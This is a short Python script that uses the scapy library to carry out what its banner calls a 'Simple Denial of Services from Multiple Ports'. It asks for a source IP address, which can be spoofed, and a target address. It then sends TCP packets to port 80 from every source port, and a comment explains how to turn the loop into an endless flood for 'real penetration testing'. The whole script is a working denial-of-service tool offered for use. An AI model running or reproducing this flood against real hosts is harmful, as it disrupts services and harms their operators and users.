##############################################################
#       Simple Denial of Services from Multiple Ports        #
##############################################################
from scapy.all import *
print '#'*40
src = raw_input("Enter the Source IP: ")
target = raw_input("Enter the Target IP: ")
print '#'*40
i=1

#Remove the Comment in Real Penetration Testing
#while True:
while i < 2:
    for srcport in range(1,65535):
        PIP = IP(src=src, dst=target)
        PTCP = TCP(sport=srcport, dport=80)
        pkt = PIP / PTCP
        send(pkt,inter= .001)
        print "Packet Sent ", i
        i=i+1
